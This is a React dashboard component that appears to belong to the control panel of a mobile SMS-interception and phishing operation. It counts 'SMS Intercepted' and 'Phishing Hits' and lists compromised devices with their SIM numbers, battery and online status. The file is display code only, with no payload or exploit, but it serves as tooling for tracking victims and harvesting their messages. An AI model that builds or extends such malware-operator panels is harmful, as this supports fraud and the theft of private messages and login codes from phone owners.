import { deviceModel } from '../utils'

interface Props {
  devices: any[]
  totalDevices: number
  onlineCount: number
  allSms: any[]
  allPhishing: any[]
  lastUpdate: string
  refresh: () => void
  onDeviceClick: (id: string) => void
}

const SVG = ({ path, size = 14 }: { path: string; size?: number }) => (
  <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <path d={path} />
  </svg>
)

export default function Dashboard({ devices, totalDevices, onlineCount, allSms, allPhishing, lastUpdate, refresh, onDeviceClick }: Props) {
  return (
    <div>
      <div className="stats">
        <div className="stat-card blue">
          <div className="stat-icon blue"><SVG path="M22 12h-4l-3 9L9 3l-3 9H2" size={16}/></div>
          <div className="stat-num">{totalDevices}</div>
          <div className="stat-label">Total Devices</div>
        </div>
        <div className="stat-card green">
          <div className="stat-icon green"><SVG path="M5 12h14M12 5l7 7-7 7" size={16}/></div>
          <div className="stat-num">{onlineCount}</div>
          <div className="stat-label">Online Now</div>
        </div>
        <div className="stat-card orange">
          <div className="stat-icon orange"><SVG path="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z" size={16}/></div>
          <div className="stat-num">{allSms.length}</div>
          <div className="stat-label">SMS Intercepted</div>
        </div>
        <div className="stat-card purple">
          <div className="stat-icon purple"><SVG path="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" size={16}/></div>
          <div className="stat-num">{allPhishing.length}</div>
          <div className="stat-label">Phishing Hits</div>
        </div>
      </div>

      <div className="refresh-bar">
        <span><SVG path="M12 1v4M12 19v4M4.22 4.22l2.83 2.83M16.95 16.95l2.83 2.83M1 12h4M19 12h4M4.22 19.78l2.83-2.83M16.95 7.05l2.83-2.83" size={12}/> <span>{lastUpdate}</span></span>
        <button className="btn-sm" onClick={refresh}><SVG path="M23 4v6h-6M1 20v-6h6"/> Refresh</button>
      </div>

      <div className="section-title"><SVG path="M22 12h-4l-3 9L9 3l-3 9H2" size={14}/> Recent Devices</div>
      <div className="device-list">
        {devices.slice(0, 5).map((d, i) => (
          <DeviceCard key={d.id} device={d} index={i} onClick={() => onDeviceClick(d.id)} />
        ))}
        {devices.length === 0 && (
          <div className="empty">
            <div className="empty-icon"><SVG path="M22 12h-4l-3 9L9 3l-3 9H2" size={48}/></div>
            <div className="empty-text">No devices registered</div>
            <div className="empty-sub">Devices will appear here when they connect</div>
          </div>
        )}
      </div>
    </div>
  )
}

function DeviceCard({ device, index, onClick }: { device: any; index: number; onClick: () => void }) {
  const online = device.status === 'online'
  const bat = parseInt(device.battery) || 0
  const batColor = bat > 50 ? 'green' : bat > 20 ? 'orange' : 'red'
  return (
    <div className="device-card" onClick={onClick}>
      <div className="device-top">
        <div className="device-model">#{index + 1} {deviceModel(device)}</div>
        <span className={`online-badge ${online ? 'on' : 'off'}`}><span className="dot"></span>{online ? 'Online' : 'Offline'}</span>
      </div>
      <div className="device-meta">
        <span><SVG path="M1 9l4-4-4-4" size={12}/> {bat}%</span>
        <span><SVG path="M22 12h-4l-3 9L9 3l-3 9H2" size={12}/> {device.sim1_name || device.sim1_number || 'N/A'}</span>
        <span><SVG path="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" size={12}/> {device.last_seen || 'Never'}</span>
      </div>
      <div className="battery-bar"><div className={`fill ${batColor}`} style={{width:bat+'%'}}/></div>
    </div>
  )
}
